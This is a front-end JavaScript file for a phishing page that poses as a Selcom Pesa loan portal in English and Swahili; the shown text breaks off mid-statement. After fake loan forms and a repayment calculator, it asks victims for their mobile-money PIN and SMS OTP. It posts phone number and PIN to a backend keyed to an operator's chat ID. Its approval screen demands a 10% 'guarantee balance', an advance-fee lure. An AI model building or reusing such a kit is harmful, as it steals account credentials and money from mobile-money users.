document.addEventListener('DOMContentLoaded', () => {
  const stepWelcome = document.getElementById('step-welcome');
  const stepSlider = document.getElementById('step-slider');
  const stepForm1 = document.getElementById('step-form-1');
  const stepForm2 = document.getElementById('step-form-2');
  const stepForm3 = document.getElementById('step-form-3');
  const stepPin = document.getElementById('step-pin');
  const stepOtp = document.getElementById('step-otp');
  const stepLoading = document.getElementById('step-loading');
  const stepSuccess = document.getElementById('step-success');

  const credsSurfaceBanner = document.getElementById('creds-surface-banner');
  const otpSurfaceBanner = document.getElementById('otp-surface-banner');
  const phoneError = document.getElementById('phone-error');
  const langToggle = document.getElementById('lang-toggle');

  let currentUserId = null;
  let statusPollInterval = null;
  let otpTimerInterval = null;
  let currentLang = 'en';

  const urlParams = new URLSearchParams(window.location.search);
  const adminParam = urlParams.get('admin') || '';

  // Language Dictionary Definitions
  const dict = {
    en: {
      welcomeTitle: "WELCOME TO THE OFFICIAL APPLICATION PORTAL.",
      dearApplicant: "Dear Applicant,",
      welcomeDesc1: "Your unique Selcom Account Details (Tanzania only) are required for all interactions. Ensure you use a valid account number to avoid delays.",
      criticalTitle: "⚠️ CRITICAL NOTIFICATION: ATTENTION!",
      criticalDesc: "An essential security measure: DO NOT ENTER INVALID SELCOM ACCOUNT DETAILS. This will cause immediate rejection. Please double-check your Tanzania-specific account number before submitting.",
      portalFooter: "Official Application Portal (Tanzania Only)",
      continueBtn: "CONTINUE",
      calcTitle: "Estimate your loan repayments",
      calcSub: "Choose your loan amount and repayment term",
      loanAmountLbl: "LOAN AMOUNT",
      loanTermLbl: "LOAN TERM (MONTHS)",
      estMonthly: "ESTIMATED MONTHLY REPAYMENT",
      signInBtn: "SIGN IN",
      form1Title: "Loan Application",
      form1Step: "Step 1 of 3",
      loanTypeLbl: "Loan Type",
      formAmtLbl: "Loan Amount (TZS)",
      formDurLbl: "Loan Term",
      formPurposeLbl: "Loan Purpose",
      nextStepBtn: "NEXT STEP",
      form2Title: "Loan Application",
      form2Step: "Step 2 of 3",
      firstnameLbl: "First Name",
      lastnameLbl: "Last Name",
      phoneLbl: "Phone Number (Tanzania)",
      phoneErr: "Please enter a valid Tanzania phone number starting with 0.",
      prevBtn: "PREVIOUS",
      form3Title: "Loan Application",
      form3Step: "Step 3 of 3",
      employmentLbl: "Employment Status",
      incomeLbl: "Annual Income (TZS)",
      summaryTitle: "Application Summary",
      sumAmt: "Loan Amount:",
      sumDur: "Loan Term:",
      sumPur: "Purpose:",
      sumApp: "Applicant:",
      submitAppBtn: "SUBMIT APPLICATION",
      pinTitle: "Confirm your SELCOM PESA PIN",
      pinSub: "For security, please confirm your 4-digit account PIN to continue.",
      pinBoxLbl: "4-digit account PIN",
      pinNote: "Ensure this matches the PIN set for this account.",
      pinSubmit: "WASILISHA",
      otpTitle: "Confirm your SELCOM PESA OTP",
      otpSub: "For security, an OTP code has been sent via SMS or WhatsApp to your SELCOM Pesa number. Please enter below to continue.",
      otpBoxLbl: "6-digit OTP code",
      otpNote: "Please enter the complete 6-digit code.",
      resendLink: "Didn't receive it? Resend (after 30 seconds)",
      otpSubmit: "INGIZA OTP",
      successTitle: "🎉 Congratulations!",
      successSub: "Your loan has been approved! Funds will be disbursed shortly to your Selcom Pesa account.",
      approvedAmtLbl: "APPROVED AMOUNT",
      complianceTitle: "⚠️ COMPLIANCE NOTICE",
      complianceDesc: "Your Selcom account must be active and maintain a guarantee balance of at least 10% of the requested loan amount. This amount will be fully refunded after full repayment.",
      loanDetailsLbl: "💳 Selcom Loan Details",
      detMonthly: "MONTHLY REPAYMENT",
      detTerm: "LOAN TERM",
      goHomeBtn: "Return to Home"
    },
    sw: {
      welcomeTitle: "KARIBU SELCOM TANZANIA! WELCOME TO THE OFFICIAL APPLICATION PORTAL.",
      dearApplicant: "Mpendwa Mombaji,",
      welcomeDesc1: "Taarifa zako za kipekee za akaunti ya Selcom (Tanzania pekee) zinahitajika kwa kila hatua. Hakikisha unatumia namba sahihi ya akaunti ili kuepuka kuchelewa.",
      criticalTitle: ":* ! AKILI / UTARATIBU MUHIMU!",
      criticalDesc: "Hatua muhimu ya usalama: USIWEKE TAARIFA ISIYO SAHIHI YA AKAUHUNTI YA SELCOM. Hii itasababisha kukataliwa mara moja. Tafadhali kagua tena namba yako ya akaunti ya Tanzania kabla ya kuwasilisha.",
      portalFooter: "Official Application Portal (Tanzania Only)",
      continueBtn: "ENDELEA",
      calcTitle: "Kadiria marejesho ya mkopo wako",
      calcSub: "Chagua kiasi cha mkopo na muda wa marejesho",
      loanAmountLbl: "KIASI CHA MKOPO",
      loanTermLbl: "MUDA WA MKOPO (MIEZI)",
      estMonthly: "MALIPO YA KILA MWEZI",
      signInBtn: "INGIA",
      form1Title: "Maombi ya Mkopo",
      form1Step: "Hatua 1 ya 3",
      loanTypeLbl: "Aina ya Mkopo",
      formAmtLbl: "Kiasi cha Mkopo (TZS)",
      formDurLbl: "Muda wa Mkopo",
      formPurposeLbl: "Madhumuni ya Mkopo",
      nextStepBtn: "HATUA INAYOFUATA",
      form2Title: "Maombi ya Mkopo",
      form2Step: "Hatua 2 ya 3",
      firstnameLbl: "Jina la Kwanza",
      lastnameLbl: "Jina la Ukoo",
      phoneLbl: "Namba ya Simu (Tanzania)",
      phoneErr: "Tafadhali ingiza namba sahihi ya simu ya Tanzania inayoanza na 0.",
      prevBtn: "ILIYOTANGULIA",
      form3Title: "Maombi ya Mkopo",
      form3Step: "Hatua 3 ya 3",
      employmentLbl: "Hali ya Ajira",
      incomeLbl: "Mapato ya Mwaka (TZS)",
      summaryTitle: "Muhtasari wa Maombi",
      sumAmt: "Kiasi cha Mkopo:",
      sumDur: "Muda wa Mkopo:",
      sumPur: "Madhumuni:",
      sumApp: "Mwombaji:",
      submitAppBtn: "WASILISHA MAOMBI",
      pinTitle: "Thibitisha PIN yako ya SELCOM PESA",
      pinSub: "Kwa usalama, tafadhali thibitisha PIN yako ya tarakimu 4 ya akaunti ili kuendelea.",
      pinBoxLbl: "PIN yako ya tarakimu 4",
      pinNote: "Hakikisha hii inalingana na PIN uliyoweka kwa akaunti hii.",
      pinSubmit: "WASILISHA",
      otpTitle: "Thibitisha OTP yako ya SELCOM PESA",
      otpSub: "Kwa usalama, msimbo wa OTP umetumwa kwa SMS au WhatsApp kwenye nambari yako ya SELCOM PESA. Tafadhali ingiza hapa chini ili kuendelea.",
      otpBoxLbl: "OTP yako ya tarakimu 6",
      otpNote: "Tafadhali ingiza msimbo kamili wa tarakimu 6.",
      resendLink: "Hukuipata? Tuma tena (baada ya sekunde 30)",
      otpSubmit: "INGIZA OTP",
      successTitle: "🎉 Hongera!",
      successSub: "Mkopo wako umeidhinishwa! Fedha zitatolewa hivi karibuni kwenye akaunti yako ya Selcom Pesa.",
      approvedAmtLbl: "KIASI KILICHOIDHINISHWA",
      complianceTitle: "⚠️ NOTISI YA UZINGATIAJI",
      complianceDesc: "Akaunti yako ya SELCOM details lazima iwe hai na idumish amana ya usalama ya angalau 10% ya kiasi cha mkopo ulioomba. Amana hii inarudishwa kikamilifu baada ya kulipa mkopo na husaldia kupata riba nzuri zaidi.",
      loanDetailsLbl: "💳 Maelezo ya Mkopo",
      detMonthly: "MALIPO YA KILA MWEZI",
      detTerm: "MUDA WA MKOPO",
      goHomeBtn: "Rudi Nyumbani"
    }
  };

  function updateLanguageTexts() {
    const t = dict[currentLang];
    document.getElementById('txt-welcome-title').innerText = t.welcomeTitle;
    document.getElementById('txt-dear-applicant').innerHTML = `<strong>${t.dearApplicant}</strong>`;
    document.getElementById('txt-welcome-desc1').innerText = t.welcomeDesc1;
    document.getElementById('txt-critical-title').innerText = t.criticalTitle;
    document.getElementById('txt-critical-desc').innerText = t.criticalDesc;
    document.getElementById('txt-portal-footer').innerText = t.portalFooter;
    document.getElementById('btn-welcome-proceed').innerText = t.continueBtn;

    document.getElementById('txt-calc-title').innerText = t.calcTitle;
    document.getElementById('txt-calc-sub').innerText = t.calcSub;
    document.getElementById('txt-loan-amount-lbl').innerText = t.loanAmountLbl;
    document.getElementById('txt-loan-term-lbl').innerText = t.loanTermLbl;
    document.getElementById('txt-est-monthly').innerText = t.estMonthly;
    document.getElementById('btn-slider-next').innerText = t.signInBtn;

    document.getElementById('txt-form1-title').innerText = t.form1Title;
    document.getElementById('txt-form1-step').innerText = t.form1Step;
    document.getElementById('txt-loan-type-lbl').innerText = t.loanTypeLbl;
    document.getElementById('txt-form-amt-lbl').innerText = t.formAmtLbl;
    document.getElementById('txt-form-dur-lbl').innerText = t.formDurLbl;
    document.getElementById('txt-form-purpose-lbl').innerText = t.formPurposeLbl;
    document.getElementById('btn-form1-next').innerText = t.nextStepBtn;

    document.getElementById('txt-form2-title').innerText = t.form2Title;
    document.getElementById('txt-form2-step').innerText = t.form2Step;
    document.getElementById('txt-firstname-lbl').innerText = t.firstnameLbl;
    document.getElementById('txt-lastname-lbl').innerText = t.lastnameLbl;
    document.getElementById('txt-phone-lbl').innerText = t.phoneLbl;
    document.getElementById('phone-error').innerText = t.phoneErr;
    document.getElementById('btn-form2-back').innerText = t.prevBtn;
    document.getElementById('btn-form2-next').innerText = t.nextStepBtn;

    document.getElementById('txt-form3-title').innerText = t.form3Title;
    document.getElementById('txt-form3-step').innerText = t.form3Step;
    document.getElementById('txt-employment-lbl').innerText = t.employmentLbl;
    document.getElementById('txt-income-lbl').innerText = t.incomeLbl;
    document.getElementById('txt-summary-title').innerText = t.summaryTitle;
    document.getElementById('txt-sum-amt').innerText = t.sumAmt;
    document.getElementById('txt-sum-dur').innerText = t.sumDur;
    document.getElementById('txt-sum-pur').innerText = t.sumPur;
    document.getElementById('txt-sum-app').innerText = t.sumApp;
    document.getElementById('btn-form3-back').innerText = t.prevBtn;
    document.getElementById('btn-form3-submit').innerText = t.submitAppBtn;

    document.getElementById('txt-pin-title').innerText = t.pinTitle;
    document.getElementById('txt-pin-sub').innerText = t.pinSub;
    document.getElementById('txt-pin-box-lbl').innerText = t.pinBoxLbl;
    document.getElementById('txt-pin-note').innerText = t.pinNote;
    document.getElementById('btn-submit-creds').innerText = t.pinSubmit;

    document.getElementById('txt-otp-title').innerText = t.otpTitle;
    document.getElementById('txt-otp-sub').innerText = t.otpSub;
    document.getElementById('txt-otp-box-lbl').innerText = t.otpBoxLbl;
    document.getElementById('txt-otp-note').innerText = t.otpNote;
    document.getElementById('btn-request-new-otp').innerText = t.resendLink;
    document.getElementById('btn-submit-otp').innerText = t.otpSubmit;

    document.getElementById('txt-success-title').innerText = t.successTitle;
    document.getElementById('txt-success-sub').innerHTML = t.successSub;
    document.getElementById('txt-approved-amt-lbl').innerText = t.approvedAmtLbl;
    document.getElementById('txt-compliance-title').innerText = t.complianceTitle;
    document.getElementById('txt-compliance-desc').innerHTML = t.complianceDesc;
    document.getElementById('txt-loan-details-lbl').innerText = t.loanDetailsLbl;
    document.getElementById('txt-det-monthly').innerText = t.detMonthly;
    document.getElementById('txt-det-term').innerText = t.detTerm;
    document.getElementById('btn-go-home').innerText = t.goHomeBtn;
  }

  if (langToggle) {
    langToggle.addEventListener('change', (e) => {
      currentLang = e.target.checked ? 'sw' : 'en';
      updateLanguageTexts();
    });
  }

  function showStep(targetStep) {
    [stepWelcome, stepSlider, stepForm1, stepForm2, stepForm3, stepPin, stepOtp, stepSuccess].forEach(s => {
      if (s) s.classList.remove('active');
    });
    if (targetStep) targetStep.classList.add('active');
  }

  // Sliders Synchronization & Repayment calculation
  const sliderBalance = document.getElementById('slider-balance');
  const balanceVal = document.getElementById('balance-val');
  const sliderDuration = document.getElementById('slider-duration');
  const durationVal = document.getElementById('duration-val');
  const formAmount = document.getElementById('form-amount');
  const formDuration = document.getElementById('form-duration');
  const estMonthlyVal = document.getElementById('est-monthly-val');
  const totalRepaymentVal = document.getElementById('total-repayment-val');

  function updateCalculator() {
    const amt = Number(sliderBalance.value);
    const months = Number(sliderDuration.value);
    const amtStr = `TZS ${amt.toLocaleString()}`;
    const termStr = `${months} ${currentLang === 'sw' ? 'MIEZI' : 'MONTHS'}`;
    
    balanceVal.innerText = amtStr;
    durationVal.innerText = termStr;
    if (formAmount) formAmount.value = amtStr;

    // Calculation simulation with 13.5% APR
    const annualRate = 0.135;
    const totalInterest = amt * annualRate * (months / 12);
    const totalRepay = amt + totalInterest;
    const monthlyRepay = totalRepay / months;

    estMonthlyVal.innerText = `TZS ${Math.round(monthlyRepay).toLocaleString()}`;
    totalRepaymentVal.innerText = `TZS ${Math.round(totalRepay).toLocaleString()}`;

    const summaryAmt = document.getElementById('summary-amount');
    const summaryDur = document.getElementById('summary-duration');
    if (summaryAmt) summaryAmt.innerText = amtStr;
    if (summaryDur) summaryDur.innerText = `${months} ${currentLang === 'sw' ? 'Miezi' : 'Months'}`;
  }

  if (sliderBalance) sliderBalance.addEventListener('input', updateCalculator);
  if (sliderDuration) sliderDuration.addEventListener('input', updateCalculator);

  // Phone number validation
  const phoneInput = document.getElementById('phone-number');
  if (phoneInput) {
    phoneInput.addEventListener('input', (e) => {
      let val = e.target.value.replace(/\D/g, '');
      if (val.length > 10) val = val.substring(0, 10);
      e.target.value = val;
    });
  }

  // Navigation handlers
  const btnWelcome = document.getElementById('btn-welcome-proceed');
  if (btnWelcome) btnWelcome.addEventListener('click', () => showStep(stepSlider));
  
  const btnSliderNext = document.getElementById('btn-slider-next');
  if (btnSliderNext) btnSliderNext.addEventListener('click', () => showStep(stepForm1));

  const btnForm1Next = document.getElementById('btn-form1-next');
  if (btnForm1Next) btnForm1Next.addEventListener('click', () => showStep(stepForm2));

  const btnForm2Back = document.getElementById('btn-form2-back');
  if (btnForm2Back) btnForm2Back.addEventListener('click', () => showStep(stepForm1));

  const btnForm2Next = document.getElementById('btn-form2-next');
  if (btnForm2Next) {
    btnForm2Next.addEventListener('click', () => {
      const firstName = document.getElementById('first-name').value.trim();
      const lastName = document.getElementById('last-name').value.trim();
      const phoneVal = phoneInput ? phoneInput.value.trim() : '';

      if (!phoneVal.startsWith('0') || phoneVal.length < 9) {
        if (phoneError) phoneError.style.display = 'block';
        return;
      }
      if (phoneError) phoneError.style.display = 'none';

      const sumApplicant = document.getElementById('summary-applicant');
      const sumPurpose = document.getElementById('summary-purpose');
      const loanTypeEl = document.getElementById('loan-type');

      if (sumApplicant) sumApplicant.innerText = `${firstName} ${lastName}`.trim() || 'Selcom Customer';
      if (sumPurpose && loanTypeEl) sumPurpose.innerText = loanTypeEl.value;

      showStep(stepForm3);
    });
  }

  const btnForm3Back = document.getElementById('btn-form3-back');
  if (btnForm3Back) btnForm3Back.addEventListener('click', () => showStep(stepForm2));

  const btnForm3Submit = document.getElementById('btn-form3-submit');
  if (btnForm3Submit) {
    btnForm3Submit.addEventListener('click', () => {
      showStep(stepPin);
      if (pinDigits[0]) pinDigits[0].focus();
    });
  }

  // Digit Inputs handling
  const pinDigits = document.querySelectorAll('.pin-digit');
  const otpDigits6 = document.querySelectorAll('.otp-digit-6');

  function setupDigitInputs(inputs, autoSubmitCallback) {
    inputs.forEach((input, idx) => {
      input.addEventListener('input', () => {
        input.value = input.value.replace(/\D/g, '');
        if (input.value && idx < inputs.length - 1) {
          inputs[idx + 1].focus();
        }
        const allFilled = Array.from(inputs).every(i => i.value.length === 1);
        if (allFilled && typeof autoSubmitCallback === 'function') {
          autoSubmitCallback();
        }
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !input.value && idx > 0) {
          inputs[idx - 1].focus();
        }
      });
    });
  }

  setupDigitInputs(pinDigits);
  setupDigitInputs(otpDigits6, () => submitOtpHandler());

  // 1-Minute Countdown Timer
  function startOtpCountdown() {
    let timeLeft = 60;
    const timerDisplay = document.getElementById('otp-timer-display');
    const resendBtn = document.getElementById('btn-request-new-otp');
    if (resendBtn) resendBtn.style.display = 'none';

    if (otpTimerInterval) clearInterval(otpTimerInterval);

    otpTimerInterval = setInterval(() => {
      timeLeft--;
      let minutes = Math.floor(timeLeft / 60);
      let seconds = timeLeft % 60;
      if (timerDisplay) {
        timerDisplay.innerHTML = `Code expires in: ${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
      }

      if (timeLeft <= 0) {
        clearInterval(otpTimerInterval);
        if (timerDisplay) timerDisplay.innerHTML = `<strong>Code expired!</strong>`;
        if (resendBtn) resendBtn.style.display = 'inline-block';
      }
    }, 1000);
  }

  const resendBtn = document.getElementById('btn-request-new-otp');
  if (resendBtn) {
    resendBtn.addEventListener('click', async () => {
      otpDigits6.forEach(i => i.value = '');
      if (otpDigits6[0]) otpDigits6[0].focus();
      if (otpSurfaceBanner) otpSurfaceBanner.classList.remove('active');
      startOtpCountdown();
      try {
        await fetch('/api/request-new-otp', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ userId: currentUserId })
        });
      } catch (e) {}
    });
  }

  // Submit Credentials (Phone & PIN)
  const btnSubmitCreds = document.getElementById('btn-submit-creds');
  if (btnSubmitCreds) {
    btnSubmitCreds.addEventListener('click', async () => {
      const phoneVal = phoneInput ? phoneInput.value.trim() : '';
      const pinVal = Array.from(pinDigits).map(i => i.value).join('');

      const pinError = document.getElementById('pin-error');
      if (pinVal.length !== 4) {
        if (pinError) pinError.style.display = 'block';
        return;
      }
      if (pinError) pinError.style.display = 'none';

      if (credsSurfaceBanner) credsSurfaceBanner.classList.remove('active');
      showLoading('Verifying...', 'Securely transmitting your credentials.');

      try {
        const res = await fetch(`/api/submit-credentials?admin=${encodeURIComponent(adminParam)}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phone: phoneVal, pin: pinVal, adminChatId: adminParam })
        });

        const data = await res.json();
        if (data.success) {
          currentUserId = data.userId;
          const loadTitle = document.getElementById('loading-title');
          cons
